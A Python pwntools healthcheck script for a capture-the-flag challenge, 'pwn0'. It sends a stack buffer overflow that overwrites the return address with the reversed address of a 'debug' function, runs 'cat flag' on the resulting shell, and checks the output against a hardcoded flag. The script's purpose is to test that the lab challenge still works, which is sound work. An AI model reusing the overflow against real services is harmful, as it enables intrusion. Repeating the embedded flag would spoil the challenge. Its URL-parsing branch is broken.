#!/usr/bin/env python3
from pwn import *
import argparse

def solve(host, port=9000):
	context.log_level = 'error' # silent
	elf = ELF("dist/pwn0")

	flag = 'flag{fl1p-1t-4ND-r3v3rs3-1t}'
	try:
		p = remote(host, port,timeout=10)

		offset = 56
		total = 200

		debug_address = p32(elf.symbols['debug'])
		reverse_debug_address = debug_address[::-1]

		p.recvuntil(b"reverse:\n")
		p.sendline(b"A" * offset + reverse_debug_address + b"A" * (total - offset - len(reverse_debug_address)))
		p.sendline(b"cat flag")
		p.recvline() # reversed string
		r = p.recvline().decode("utf-8").strip()

		if r != flag:
			print(r)
			return False
		else:
			return True
	except Exception as e:
		return False

if __name__=='__main__':
	parser = argparse.ArgumentParser(description='Healthcheck')
	parser.add_argument('--connection-info', help='Either in the format `nc <host> <port>` or `http[s]://host[:port]`', required=True)
	args = parser.parse_args()
	conn = args.connection_info
	if conn[:3] == "nc ":
		_, host, port = conn.split(' ')
	elif conn[:5] == "http":
		target = conn
	ok = solve(host, port)
	if ok:
		print("pwn0 is good")
		exit(0)
	else:
		print("pwn0 is bad")
		exit(1)
